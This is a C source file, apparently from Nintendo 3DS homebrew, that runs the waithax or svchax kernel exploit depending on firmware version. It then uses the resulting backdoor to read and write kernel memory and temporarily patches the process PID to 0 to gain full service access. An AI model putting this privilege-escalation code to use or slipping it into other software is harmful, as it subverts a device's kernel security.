#include <3ds.h>
#include <stdio.h>

#include "khax.h"
#include "svchax/svchax.h"
#include "waithax/waithax.h"

#define CURRENT_KPROCESS 0xFFFF9004

static void (*khax_backdoor)(void (*func)());

static volatile u32 khax_read32_kernel_addr;
static volatile u32 khax_read32_kernel_result;

static volatile u32 khax_write32_kernel_addr;
static volatile u32 khax_write32_kernel_value;

static void khax_read32_kernel_priv() {
    khax_read32_kernel_result = *(u32*) khax_read32_kernel_addr;
}

static u32 khax_read32_kernel(u32 addr) {
    khax_read32_kernel_addr = addr;
    khax_backdoor(khax_read32_kernel_priv);
    return khax_read32_kernel_result;
}

static void khax_write32_kernel_priv() {
    *(u32*) khax_write32_kernel_addr = khax_write32_kernel_value;
}

static void khax_write32_kernel(u32 addr, u32 value) {
    khax_write32_kernel_addr = addr;
    khax_write32_kernel_value = value;
    khax_backdoor(khax_write32_kernel_priv);
}

bool khax_execute() {
    printf("khax: Retrieving system information...\n");

    u32 kver = osGetKernelVersion();
    bool n3ds = false;
    APT_CheckNew3DS(&n3ds);

    void (*khax_cleanup)() = NULL;

    if(envIsHomebrew()) {
        printf("khax: Choosing exploit to execute...\n");

        if(kver > SYSTEM_VERSION(2, 51, 2)) {
            printf("khax: Unsupported firmware version.\n");
            return false;
        } else if(kver > SYSTEM_VERSION(2, 50, 11)) {
            printf("khax: Executing waithax...\n");

            osSetSpeedupEnable(true);

            if(!waithax_run()) {
                printf("khax: waithax failed.\n");
                return false;
            }

            osSetSpeedupEnable(false);

            khax_backdoor = waithax_backdoor;
            khax_cleanup = NULL;
        } else {
            printf("khax: Executing svchax...\n");

            svchax_init(false);

            if(!__ctr_svchax) {
                printf("khax: svchax failed.\n");
                return false;
            }

            khax_backdoor = (void (*)(void (*func)())) svcBackdoor;
            khax_cleanup = waithax_cleanup;
        }

        printf("khax: Kernel exploit executed successfully.\n");
    } else {
        printf("khax: Not running as a 3DSX; assuming CIA/3DS with svcBackdoor access.\n");

        khax_backdoor = (void (*)(void (*func)())) svcBackdoor;
        khax_cleanup = NULL;
    }

    printf("khax: Retrieving PID kernel address...\n");
    u32 pidAddr = khax_read32_kernel(CURRENT_KPROCESS) + (n3ds ? 0xBC : (kver > SYSTEM_VERSION(2, 40, 0)) ? 0xB4 : 0xAC);

    printf("khax: Backing up PID and patching to 0...\n");
    u32 oldPid = khax_read32_kernel(pidAddr);
    khax_write32_kernel(pidAddr, 0);

    printf("khax: Reinitializing srv...\n");
    srvExit();
    srvInit();

    printf("khax: Restoring PID...\n");
    khax_write32_kernel(pidAddr, oldPid);

    printf("khax: Cleaning up...\n");
    if(khax_cleanup != NULL) {
        khax_cleanup();
    }

    printf("khax: Success.\n");
    return true;
}